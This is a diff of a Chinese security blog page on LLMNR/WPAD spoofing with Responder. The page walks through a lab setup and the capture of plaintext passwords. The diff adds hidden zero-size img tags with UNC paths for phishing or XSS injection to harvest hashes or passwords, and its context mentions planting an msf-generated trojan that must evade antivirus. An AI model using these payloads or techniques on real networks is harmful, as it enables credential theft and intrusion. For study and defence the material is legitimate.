@@ -138,8 +138,9 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/internetconfig.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/ftp-2.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/responder-4.jpg">
+<meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/responder-5.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/shell-1.jpg">
-<meta property="og:updated_time" content="2018-03-08T16:02:14.622Z">
+<meta property="og:updated_time" content="2018-03-09T17:14:58.840Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="中间人攻击————LLMNR、WPAD以及Responder">
 <meta name="twitter:description" content="概述继续学习一波中间人攻击的LLMNR、WPAD以及Responder，备忘。">
@@ -524,7 +525,7 @@
 </ol>
 <h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为<code>自动检测代理设置</code>的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。</p>
 <p>假设现在有三台机器：</p>
-<p>A 被欺骗主机： 192.168.111.170<br>B 攻击机：192.168.111.183<br>C 被欺骗主机要访问的服务器：192.168.111.156（desktop-9hmbf0）</p>
+<p>A 被欺骗主机： 192.168.111.170<br>B 攻击机：192.168.111.183<br>C 被欺骗主机要访问的服务器：192.168.111.184</p>
 <h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
 <li>在C服务器上,也就是我们的服务器上先创建一个共享目录：</li>
 </ol>
@@ -543,14 +544,13 @@
 </ol>
 <p><img src="/images/spoof-llmnr-wpad/ftp-2.jpg" alt="ftp-2"></p>
 <ol>
-<li><ol>
 <li>Kali 攻击机上可以看到如下明文密码</li>
 </ol>
-</li>
-</ol>
 <p><img src="/images/spoof-llmnr-wpad/responder-4.jpg" alt="responder-4"></p>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Responder-结合钓鱼页面-跨站进行"><a href="#Responder-结合钓鱼页面-跨站进行" class="headerlink" title="Responder 结合钓鱼页面/跨站进行"></a>Responder 结合钓鱼页面/跨站进行</h2><p>伪造钓鱼页面或者借助跨站插入如下相关请求：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;img/src=\\orleven\1.jpg width=0 height=0&gt; </div><div class="line">&lt;img/src=http:\\orleven\1.jpg width=0 height=0&gt;</div></pre></td></tr></table></figure>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Responder-结合钓鱼页面-跨站进行"><a href="#Responder-结合钓鱼页面-跨站进行" class="headerlink" title="Responder 结合钓鱼页面/跨站进行"></a>Responder 结合钓鱼页面/跨站进行</h2><p>伪造钓鱼页面或者借助跨站插入如下相关请求，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;img/src=\\WIN764TEST1\1.jpg width=0 height=0&gt; </div><div class="line">&lt;img/src=http:\\WIN764TEST1\1.jpg width=0 height=0&gt;</div></pre></td></tr></table></figure>
+<p>如果受害者进行了账号密码输入，那么就能得到相应的信息，比如hash值或者明文密码等。</p>
+<p><img src="/images/spoof-llmnr-wpad/responder-5.jpg" alt="responder-5"></p>
 <h2 id="responder-钓鱼木马"><a href="#responder-钓鱼木马" class="headerlink" title="responder 钓鱼木马"></a>responder 钓鱼木马</h2><ol>
 <li>首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中，</li>
 </ol>
